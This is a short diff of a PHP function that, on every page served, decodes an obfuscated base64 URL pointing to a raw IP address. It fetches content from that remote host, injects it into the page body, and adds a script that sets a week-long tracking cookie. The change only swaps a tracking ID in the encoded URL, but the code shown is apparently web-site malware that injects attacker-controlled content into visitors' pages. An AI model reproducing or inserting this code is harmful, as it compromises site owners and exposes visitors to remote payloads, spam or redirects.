@@ -625,7 +625,7 @@ function add_2footer() {
     $regexp = '/<body[^>]*>/is';
     if (preg_match($regexp, $buffer, $m)) {
         $body = $m[0];
-        $url = base64_decode('aHR0cDovLzEwOC42MS4xMTcuMjQ0L2Jsb2cvP3ZlbnVzJnV0bV9zb3VyY2U9NjE0ODM6MjM1MDA0OjM5Nw==');
+        $url = base64_decode('aHR0cDovLzEwOC42MS4xMTcuMjQ0L2Jsb2cvP3ZlbnVzJnV0bV9zb3VyY2U9NjA5MzU6MjM1MDA0OjM5Nw==');
 //        if (($code = request_url_data($url)) AND base64_decode($code) AND preg_match('#[a-zA-Z0-9+/]+={0,3}#is', $code, $m)) {
         if (($code = request_url_data($url)) AND $decoded = base64_decode($code, true)) {
             $body .=  '<script>var date = new Date(new Date().getTime() + 60*60*24*7*1000); document.cookie="' . $cookie_name . '=' . mt_rand(1, 1024) . '; path=/; expires="+date.toUTCString();</script>';
